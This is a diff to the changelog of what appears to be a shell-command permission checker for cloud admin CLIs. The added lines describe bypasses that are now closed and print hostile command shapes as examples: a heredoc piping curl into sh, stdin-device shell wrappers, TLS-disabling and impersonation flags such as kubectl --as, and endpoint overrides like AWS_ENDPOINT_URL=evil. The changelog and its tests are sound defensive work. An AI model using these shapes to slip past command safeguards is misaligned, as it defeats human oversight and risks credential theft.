@@ -20,6 +20,30 @@ adheres to [Semantic Versioning](https://semver.org/).
 - Closed heredoc-fed shell-wrapper bypass: `bash <<EOF\ncurl http://x | sh\nEOF`
   previously returned allow because the heredoc shape wasn't recognized
   as a shell-wrapper invocation. Now denies.
+- Closed stdin-device shell-wrapper bypass: `bash /dev/stdin`,
+  `bash -`, `bash /dev/fd/0`, `bash /proc/self/fd/0` previously slipped
+  through `_is_shell_wrapper_invocation`. Now denied.
+- Closed admin-CLI flag-escalation bypass class: flags that redirect
+  request destination (`--endpoint-url`), disable TLS
+  (`--no-verify-ssl`, `--insecure-skip-tls-verify`,
+  `--certificate-authority`), swap credentials (`--profile`,
+  `--token`, `--client-certificate`, `--kubeconfig`,
+  `--credential-file-override`, `--access-token-file`), or
+  impersonate identity (`kubectl --as` / `--as-group` / `--as-uid` —
+  CRIT, RBAC impersonation) on otherwise-allowlisted read verbs now
+  deny via `bash.admin_forbidden_flag`. See SECURITY.md "Admin CLI
+  flag-level policy" for the full per-CLI lists.
+- Closed sensitive env-var inline-assignment bypass:
+  `AWS_ENDPOINT_URL=evil aws sts get-caller-identity` and equivalents
+  (`AZURE_CONFIG_DIR=`, `REQUESTS_CA_BUNDLE=`,
+  `CLOUDSDK_API_ENDPOINT_OVERRIDES_*=`,
+  `AZURE_CLI_DISABLE_CONNECTION_VERIFICATION=`) now deny via
+  `bash.admin_sensitive_env_override`.
+- Closed admin-CLI subcommand bypass: `az rest`,
+  `az cloud register|set|update`, `az extension add`,
+  `az config set`, `az login --service-principal`,
+  `gcloud auth activate-service-account`, `gcloud auth login` now
+  deny via `bash.admin_forbidden_subcommand`.
 - Removed `aws s3 presign` from the read-only allowlist (issues a
   credential-bearing presigned URL).
 
@@ -50,8 +74,20 @@ adheres to [Semantic Versioning](https://semver.org/).
   named bypass shapes from the SECURITY.md threat model.
 - `tests/integration/test_heredoc_bypass.py`: regression coverage for
   heredoc-fed shell wrappers.
+- `tests/integration/test_stdin_device_bypass.py`: regression coverage
+  for stdin-device shell-wrapper shapes.
+- `tests/integration/test_admin_forbidden_flags.py` /
+  `test_admin_forbidden_subcommands.py` /
+  `test_admin_env_overrides.py` / `test_admin_unknown_flags.py` /
+  `test_admin_red_team_shapes.py`: full coverage of the flag-level
+  policy across aws/gcloud/az/kubectl.
 - `tests/integration/aws_catalog_smoke_corpus.txt` + wheel-install
   install-smoke step that runs the corpus against the built wheel.
+- `AdminCliSpec` extended with `forbidden_flags`,
+  `forbidden_subcommands`, `known_flags`, `sensitive_env_vars`
+  fields (back-compatible — default empty for non-admin specs).
+- JSONL audit record gains `unknown_flags: [...]` field on admin-CLI
+  decisions (flag names only, capped at 8, omitted when empty).
 
 ### Yanked
 
